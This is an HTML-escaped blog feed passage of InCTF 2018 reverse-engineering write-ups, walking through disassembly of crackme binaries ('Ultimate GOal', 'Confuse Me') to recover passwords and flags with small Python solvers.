    .text:000000000040156F         mov     edi, offset aGoodWork ; &amp;quot;\nGood Work!!&amp;quot;
    .text:0000000000401574         call    _puts
    .text:0000000000401579         lea     rdx, [rbp+stage2_input]
    .text:000000000040157D         lea     rax, [rbp+stage1_input]
    .text:0000000000401581         mov     rsi, rdx
    .text:0000000000401584         mov     rdi, rax
    .text:0000000000401587         call    sub_401471

    .text:0000000000401471 sub_401471      proc near
    .text:0000000000401471
    .text:0000000000401471 var_10          = qword ptr -10h
    .text:0000000000401471 var_8           = qword ptr -8
    .text:0000000000401471
    .text:0000000000401471         push    rbp
    .text:0000000000401472         mov     rbp, rsp
    .text:0000000000401475         sub     rsp, 10h
    .text:0000000000401479         mov     [rbp+var_8], rdi
    .text:000000000040147D         mov     [rbp+var_10], rsi
    .text:0000000000401481         mov     edi, offset s   ; &amp;quot;-------------------&amp;quot;
    .text:0000000000401486         call    _puts
    .text:000000000040148B         mov     rdx, [rbp+var_10]
    .text:000000000040148F         mov     rax, [rbp+var_8]
    .text:0000000000401493         mov     rsi, rax
    .text:0000000000401496         mov     edi, offset aTheFlagIsInctf ; &amp;quot;The FLAG is: inctf{\%s\%s}\n&amp;quot;
    .text:000000000040149B         mov     eax, 0
    .text:00000000004014A0         call    _printf
    .text:00000000004014A5         nop
    .text:00000000004014A6         leave
    .text:00000000004014A7         retn
    .text:00000000004014A7 sub_401471      endp
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! now we have the flag - &amp;ldquo;inctf{&amp;rdquo; + stage1_input + stage2_input + &amp;ldquo;}&amp;rdquo; = &lt;code&gt;&amp;quot;inctf{th3_mast3r_is_r00tus3r_and_h3_l0v3s_un1c0rn!}&amp;quot;&lt;/code&gt;&lt;/p&gt;</description>
        </item>
        <item>
        <title>InCTF 2018 - Ultimate GOal</title>
        <link>http://localhost:1313/post/inctf-2018-ultimate-goal/</link>
        <pubDate>Sun, 07 Oct 2018 00:00:00 +0530</pubDate>
        
        <guid>http://localhost:1313/post/inctf-2018-ultimate-goal/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/inctf18_ultimategoal.png&#34; alt=&#34;Image0&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Its a golang binary. The first task is to find &lt;strong&gt;&amp;lsquo;main_main&amp;rsquo;&lt;/strong&gt; routine. Its located at 0x4ebcc0&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00000000004EBD15                 lea     rax, off_53B6E8
    .text:00000000004EBD1C                 mov     [rsp+198h+var_190], rax
    .text:00000000004EBD21                 call    runtime_deferproc

    .rodata:000000000053B6E8 off_53B6E8    dq      offset main_final
    .rodata:000000000053B6F0 off_53B6F0    dq      offset main_handleit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay, so we have a deferred call to &lt;strong&gt;&amp;lsquo;main_final&amp;rsquo;&lt;/strong&gt;. It prints &amp;lsquo;Enter pass:&amp;rsquo; and calls Reader_Read to read a string which is converted to a byte array using runtime_stringtoslicebyte and calls &lt;strong&gt;main_obfus&lt;/strong&gt;, which looks like this&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main_obfus&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;bytes&lt;/span&gt;)
        temp = &lt;span style=&#34;color:#24909d&#34;&gt;bytes&lt;/span&gt;[::-&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;]
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; temp[&lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt;:&lt;span style=&#34;color:#3677a9&#34;&gt;11&lt;/span&gt;]+temp[&lt;span style=&#34;color:#3677a9&#34;&gt;11&lt;/span&gt;:&lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;]+temp[:&lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;main_main&lt;/strong&gt; then stores the array of bytes returned by &lt;strong&gt;main_obfus&lt;/strong&gt; and stores into a global variable at 0x5de130. It stores len(temp[9:11])+len(temp[11:13]) in 0x5de138, len(temp[:9]) in 0x5de148, and len(temp[:9]) in 0x5de140.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;main_final&lt;/strong&gt; calls &lt;strong&gt;main_swap&lt;/strong&gt; with four arguments - the string at 0x5de130, 4, 0x5de134, 9. Let&amp;rsquo;s take a look at &lt;strong&gt;main_swap&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main_swap&lt;/span&gt;(a, b, c, d)
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; main_check(a, b):
            &lt;span style=&#34;color:#24909d&#34;&gt;exit&lt;/span&gt;()
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; c[:d]:
            &lt;span style=&#34;color:#24909d&#34;&gt;exit&lt;/span&gt;()

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main_check&lt;/span&gt;(string, &lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;):
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;try&lt;/span&gt;:
            &lt;span style=&#34;color:#24909d&#34;&gt;int&lt;/span&gt;(string[:&lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;])
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;except&lt;/span&gt;:
            &lt;span style=&#34;color:#24909d&#34;&gt;exit&lt;/span&gt;()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, 0x5de130 must contain 4 digits, followed by a string of length 9 without any &amp;lsquo;.&amp;rsquo;.
It calls &lt;strong&gt;net_Listen&lt;/strong&gt; on the string &amp;ldquo;%s:%s&amp;rdquo; % (0x5de134, 0x5de130)
Now, the password is clear. 0x5de134 stores the hostname which is of 9 letters without any dot - &amp;ldquo;localhost&amp;rdquo;. And the 4 digits at 0x5de130 represent the port, for the tcp server.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s take the port as 1234. So, what will be our password ?
Go to &lt;strong&gt;main_obfus&lt;/strong&gt; and take a look. The first two characters of the input are insignificant the remaining is &lt;strong&gt;&amp;ldquo;localhost1234&amp;rdquo;[::-1]&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s try &amp;ldquo;xx4321tsohlacol&amp;rdquo; as input. Which will make &lt;strong&gt;main_final&lt;/strong&gt; start a tcp server at localhost:1234.&lt;/p&gt;
&lt;p&gt;For every incoming connection, &lt;strong&gt;main_handleit&lt;/strong&gt; is called. In &lt;strong&gt;main_handleit&lt;/strong&gt;, the string written to the socket must be of length 16.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00000000004ED125      call    rcx             ; net__ptr_TCPConn_Read
    .text:00000000004ED127      mov     rax, [rsp+1D0h+var_98]
    .text:00000000004ED12F      mov     [rsp+1D0h+var_1D0], rax
    .text:00000000004ED133      mov     rcx, [rsp+1D0h+var_178]
    .text:00000000004ED138      mov     [rsp+1D0h+var_1C8], rcx
    .text:00000000004ED13D      mov     rdx, [rsp+1D0h+var_170]
    .text:00000000004ED142      mov     [rsp+1D0h+var_1C0], rdx
    .text:00000000004ED147      call    main_findlen
    .text:00000000004ED14C      mov     rax, [rsp+1D0h+var_1B8]
    .text:00000000004ED151      cmp     rax, 10h
    .text:00000000004ED155      jnz     loc_4ED4D7
    .text:00000000004ED15B      mov     rcx, [rsp+1D0h+port]
    .text:00000000004ED160      xor     edx, edx
    .text:00000000004ED162      jmp     short loc_4ED18E
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have an array of qwords computed as follows&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    var_130 = [&lt;span style=&#34;color:#3677a9&#34;&gt;0x327&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x125&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x436&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0xc91&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x167&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x282&lt;/span&gt;]
    var_100 = [&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;(var_130))]
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;(var_130)):
        var_100[i] = port % var_130[i]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It then calls &lt;strong&gt;main_obfus2&lt;/strong&gt; with the string read from the socket as argument&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00000000004ECD01      mov     rax, cs:port_len         ; 0x5de138
    .text:00000000004ECD08      mov     rcx, cs:socket_address   ; 0x5de130
    .text:00000000004ECD0F      mov     rdx, [rsp+60h+arg_8]     ; string length
    .text:00000000004ECD14      cmp     rdx, rax
    .text:00000000004ECD17      jge     loc_4ECF0C

    [ ... snip ... ]

    .text:00000000004ECF0C loc_4ECF0C:
    .text:00000000004ECF0C      mov     rdx, [rsp+60h+arg_0]
    .text:00000000004ECF11      mov     [rsp+60h+var_60], rdx    ; string read
    .text:00000000004ECF15      mov     [rsp+60h+var_58], rax    ; port length
    .text:00000000004ECF1A      mov     [rsp+60h+var_50], rcx    ; socket address - 1234localhost
    .text:00000000004ECF1F      mov     [rsp+60h+var_48], rax    ; port length
    .text:00000000004ECF24      call    runtime_eqstring
    .text:00000000004ECF29      movzx   eax, byte ptr [rsp+60h+var_40]
    .text:00000000004ECF2E      mov     rdx, [rsp+60h+arg_8]
    .text:00000000004ECF33      jmp     loc_4ECD1F
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great, so the first 4 bytes of the input must be the port of the tcp server.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00000000004ECD1F      test    al, al
    .text:00000000004ECD21      jz      loc_4ECEFD
    .text:00000000004ECD27      mov     rax, cs:host_len         ; length of host (in password)
    .text:00000000004ECD2E      mov     rcx, cs:aHost            ; address in 0x5de140
    .text:00000000004ECD35      cmp     rax, 7
    .text:00000000004ECD39      jb      loc_4ECF3F
    .text:00000000004ECD3F      mov     rax, [rsp+60h+arg_0]
    .text:00000000004ECD44      mov     [rsp+60h+var_60], rax    ; string read from socket
    .text:00000000004ECD48      mov     [rsp+60h+var_58], rdx    ; string length
    .text:00000000004ECD4D      add     rcx, 4
    .text:00000000004ECD51      mov     [rsp+60h+var_50], rcx    ; &amp;amp;hostname[0]+4
    .text:00000000004ECD56      mov     [rsp+60h+var_48], 3      ; 3 chars substring
    .text:00000000004ECD5F      call    strings_Index
    .text:00000000004ECD64      mov     rax, [rsp+60h+var_40]
    .text:00000000004ECD69      cmp     rax, 4
    .text:00000000004ECD6D      jnz     loc_4ECEEE
    .text:00000000004ECD73      mov     rax, [rsp+60h+arg_8]
    .text:00000000004ECD78      cmp     rax, 0Ch
    .text:00000000004ECD7C      jb      loc_4ECF38
    .text:00000000004ECD82      mov     rax, [rsp+60h+arg_0]
    .text:00000000004ECD87      add     rax, 7
    .text:00000000004ECD8B      mov     [rsp+60h+var_10], rax
    .text:00000000004ECD90      mov     [rsp+60h+var_60], rax
    .text:00000000004ECD94      mov     [rsp+60h+var_58], 5
    .text:00000000004ECD9D      call    main_check
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;hostName must be of length atleast 7. The index of hostname[4:7] in the string must be 4. The string length must be atleast 12
So, we have - the string is of the format &lt;strong&gt;&amp;ldquo;1234????????????&amp;quot;&lt;/strong&gt; where &amp;lsquo;?&amp;rsquo; is unknown.&lt;/p&gt;
&lt;p&gt;Now, &lt;strong&gt;string[4:7] == &amp;ldquo;localhost&amp;rdquo;[4:7]&lt;/strong&gt;. Thus the string now is &lt;strong&gt;&amp;ldquo;1234lho?????????&amp;quot;&lt;/strong&gt;. It then calls &lt;strong&gt;main_check&lt;/strong&gt; on string[7:12], which implies, the 5 characters from offset 7 must be digits.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .text:00000000004ECDBA loc_4ECDBA:
    .text:00000000004ECDBA      mov     rax, [rsp+60h+var_10]
    .text:00000000004ECDBF      mov     [rsp+60h+var_60], rax
    .text:00000000004ECDC3      mov     [rsp+60h+var_58], 5
    .text:00000000004ECDCC      call    strconv_Atoi
    .text:00000000004ECDD1      mov     rax, [rsp+60h+var_48]
    .text:00000000004ECDD6      mov     rcx, [rsp+60h+var_50]
    .text:00000000004ECDDB      test    rax, rax
    .text:00000000004ECDDE      jnz     loc_4ECEDF

    .text:00000000004ECDE4      mov     [rsp+60h+var_60], rcx
    .text:00000000004ECDE8      call    math_big_NewInt
    .text:00000000004ECDED      mov     rax, [rsp+60h+var_58]
    .text:00000000004ECDF2      mov     [rsp+60h+var_30], rax        ; var_30 = int(string[7:12])
    .text:00000000004ECDF7      mov     [rsp+60h+var_60], 7Bh
    .text:00000000004ECDFF      call    math_big_NewInt
    .text:00000000004ECE04      mov     rax, [rsp+60h+var_58]
    .text:00000000004ECE09      mov     [rsp+60h+var_38], rax        ; var_38 = 0x7b
    .text:00000000004ECE0E      mov     [rsp+60h+var_60], 81BBh
    .text:00000000004ECE16      call    math_big_NewInt
    .text:00000000004ECE1B      mov     rax, [rsp+60h+var_58]
    .text:00000000004ECE20      mov     [rsp+60h+var_28], rax        ; var_28 = 0x81bb
    .text:00000000004ECE25      mov     [rsp+60h+var_60], 84h
    .text:00000000004ECE2D      call    math_big_NewInt
    .text:00000000004ECE32      mov     rax, [rsp+60h+var_58]
    .text:00000000004ECE37      mov     [rsp+60h+var_20], rax        ; var_20 = 0x84
    .text:00000000004ECE3C      mov     [rsp+60h+var_60], 0A7D5h
    .text:00000000004ECE44      call    math_big_NewInt
    .text:00000000004ECE49      mov     rax, [rsp+60h+var_58]
    .text:00000000004ECE4E      mov     [rsp+60h+var_18], rax        ; var_18 = 0xa7d5
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now we have, &lt;strong&gt;(var_30 + var_38 ^ var_28) - var_20 == var_18&lt;/strong&gt;. Thus var_30 = (var_18+var_20 ^ var_28)-var_38 = 10599&lt;br&gt;
The string, now is &lt;strong&gt;1234lho10599???&lt;/strong&gt; as a newline is appended as the 15th char.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;main_handleit&lt;/strong&gt; now calls &lt;strong&gt;main_hasherboy&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;hasherboy&lt;/span&gt;(string):
        &lt;span style=&#34;color:#24909d&#34;&gt;hash&lt;/span&gt; = &lt;span style=&#34;color:#24909d&#34;&gt;map&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;, md5(string[:&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;]).hexdigest())
        magic = [&lt;span style=&#34;color:#3677a9&#34;&gt;124&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;120&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;106&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;65&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;102&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;97&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;103&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;98&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;114&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;69&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;117&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;78&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;82&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;54&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;67&lt;/span&gt;]
        ans = []
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;(magic)):
            ans.append(&lt;span style=&#34;color:#24909d&#34;&gt;hash&lt;/span&gt;[i] ^ magic[i])
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;.join(&lt;span style=&#34;color:#24909d&#34;&gt;map&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;, ans))

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;The Flag is  :   &amp;#39;&lt;/span&gt;,
    ans = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    var_D0 = [i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; var_100]
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; var_D0:
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt;(end=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;(i))
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; hasherboy(string) + &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Great! now we can find the port of the tcp server easily. Recall that, &lt;strong&gt;var_100 = [port % i for i in [0x327, 0x125, 0x436, 0xc91, 0x167, 0x282]]&lt;/strong&gt; and since the flag starts with &lt;strong&gt;&amp;ldquo;inctf{&amp;quot;&lt;/strong&gt;, we have&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;    ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/inctf]
    └──╼ $ cat solve.py
    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;#!/usr/bin/env python&lt;/span&gt;

    &lt;span style=&#34;color:#40ffff&#34;&gt;magic&lt;/span&gt; = [0x327, 0x125, 0x436, 0xc91, 0x167, 0x282]

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; port in xrange(0x10000):
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;inctf{&amp;#39;&lt;/span&gt; == &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;.join([chr(port % i &amp;amp; 0xff) &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i in magic]):
            print &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;[*] Port: %d&amp;#39;&lt;/span&gt; % port
            &lt;span style=&#34;color:#24909d&#34;&gt;break&lt;/span&gt;
    ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/inctf]
    └──╼ $ python solve.py
    [*] Port: &lt;span style=&#34;color:#3677a9&#34;&gt;3333&lt;/span&gt;
    ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/inctf]
    └──╼ $
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, the password is &lt;strong&gt;&amp;ldquo;XX3333tsohlacol&amp;rdquo;&lt;/strong&gt; and the string to be sent to the server at localhost:3333 is &lt;strong&gt;&amp;ldquo;3333lho10599XXX&amp;rdquo;&lt;/strong&gt; where X can be any character. The flag is &lt;strong&gt;&amp;ldquo;inctf{&amp;rdquo; + hasherboy(&amp;ldquo;3333lho10599&amp;rdquo;) + &amp;ldquo;}&amp;quot;&lt;/strong&gt; which is &lt;code&gt;&amp;quot;inctf{D4mN_7h4t_W4s_T1rinG!!!L0v3_R3x!}&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/inctf18_ultimategoal0.png&#34; alt=&#34;Image1&#34;  /&gt;&lt;/p&gt;</description>
        </item>
        <item>
        <title>INCTF - Confuse Me</title>
        <link>http://localhost:1313/post/inctf-confuse-me/</link>
        <pubDate>Wed, 12 Sep 2018 00:00:00 +0530</pubDate>
        
        <guid>http://localhost:1313/post/inctf-confuse-me/</guid>
        <description>&lt;p&gt;Fire up Radare and open the binary&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/confuseme/i0.png&#34; alt=&#34;Image1&#34;  /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    push   rbp
    mov    rbp,rsp
    sub    rsp,0x50
    mov    rax,QWORD PTR fs:0x28

    mov    QWORD PTR [rbp-0x8],rax
    xor    eax,eax
    mov    esi,0x40109b
    mov    edi,0xb
    call   0x4abd40
    mov    BYTE PTR [rbp-0x20],0x4d        ; &amp;quot;MGNCHXWIZDJAOKPELYSFUTV&amp;quot;
    mov    BYTE PTR [rbp-0x1f],0x47
    mov    BYTE PTR [rbp-0x1e],0x4e
    mov    BYTE PTR [rbp-0x1d],0x43
    mov    BYTE PTR [rbp-0x1c],0x48
    mov    BYTE PTR [rbp-0x1b],0x58
    mov    BYTE PTR [rbp-0x1a],0x57
    mov    BYTE PTR [rbp-0x19],0x49
    mov    BYTE PTR [rbp-0x18],0x5a
    mov    BYTE PTR [rbp-0x17],0x44
    mov    BYTE PTR [rbp-0x16],0x4a
    mov    BYTE PTR [rbp-0x15],0x41
    mov    BYTE PTR [rbp-0x14],0x4f
    mov    BYTE PTR [rbp-0x13],0x4b
    mov    BYTE PTR [rbp-0x12],0x50
    mov    BYTE PTR [rbp-0x11],0x45
    mov    BYTE PTR [rbp-0x10],0x4c
    mov    BYTE PTR [rbp-0xf],0x59
    mov    BYTE PTR [rbp-0xe],0x53
    mov    BYTE PTR [rbp-0xd],0x46
    mov    BYTE PTR [rbp-0xc],0x55
    mov    BYTE PTR [rbp-0xb],0x54
    mov    BYTE PTR [rbp-0xa],0x56
    mov    esi,0x54fa2a                     ; &amp;quot;Enter Input:&amp;quot;
    mov    edi,0x7accc0
    call   0x40e670
    mov    DWORD PTR [rbp-0x48],0x0
    loop_0:
        cmp    DWORD PTR [rbp-0x48],0x16
        jg     end_0
        lea    rdx,[rbp-0x40]
        mov    eax,DWORD PTR [rbp-0x48]
        cdqe   
        add    rax,rdx
        mov    rsi,rax
        mov    edi,0x7acde0
        call   0x408ca0
        add    DWORD PTR [rbp-0x48],0x1
        jmp    loop_0

    end_0:
    mov    eax,0x17
    mov    DWORD PTR [rbp-0x44],eax
    mov    edx,DWORD PTR [rbp-0x44]         ; length
    lea    rcx,[rbp-0x40]
    lea    rax,[rbp-0x20]
    mov    rsi,rcx                          ; our input string
    mov    rdi,rax                          ; magic string
    call   check
    mov    eax,DWORD PTR [rip+0x3aabc7]        # 0x7abd70
    cmp    eax,0x17
    jne    invalid_input
    lea    rax,[rbp-0x40]
    mov    rdi,rax
    call   print_flag
    jmp    finish

    invalid_input:
        mov    esi,0x54fa25                ; &amp;quot;Nope&amp;quot;
        mov    edi,0x7accc0
        call   0x40e670

    finish:
        mov    eax,0x0
        mov    rcx,QWORD PTR [rbp-0x8]
        xor    rcx,QWORD PTR fs:0x28

        je     $+7
        call   0x50a840
        leave  
        ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The routine validates a string of length atleast 23 bytes using the magic string &amp;ldquo;MGNCHXWIZDJAOKPELYSFUTV&amp;rdquo;.
Let&amp;rsquo;s take a look at check routine.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;           0x00400eb4      55             push rbp
           0x00400eb5      4889e5         mov rbp, rsp
           0x00400eb8      4883ec30       sub rsp, 0x30               ; &#39;0&#39;
           0x00400ebc      48897de8       mov qword [local_18h], rdi
           0x00400ec0      488975e0       mov qword [local_20h], rsi
           0x00400ec4      8955dc         mov dword [local_24h], edx
           0x00400ec7      488b45e0       mov rax, qword [local_20h]
           0x00400ecb      0fb600         movzx eax, byte [rax]
           0x00400ece      0fbec8         movsx ecx, al
           0x00400ed1      8b55dc         mov edx, dword [local_24h]
           0x00400ed4      488b45e8       mov rax, qword [local_18h]
           0x00400ed8      89ce           mov esi, ecx
           0x00400eda      4889c7         mov rdi, rax
           0x00400edd      e88cffffff     call fcn.00400e6e
           0x00400ee2      8945fc         mov dword [local_4h], eax
           0x00400ee5      837dfc00       cmp dword [local_4h], 0
       ┌─&amp;lt; 0x00400ee9      741a           je 0x400f05
       │   0x00400eeb      488b45e0       mov rax, qword [local_20h]
       │   0x00400eef      488d4801       lea rcx, rax + 1            ; 1
       │   0x00400ef3      8b55fc         mov edx, dword [local_4h]
       │   0x00400ef6      488b45e8       mov rax, qword [local_18h]
       │   0x00400efa      4889ce         mov rsi, rcx
       │   0x00400efd      4889c7         mov rdi, rax
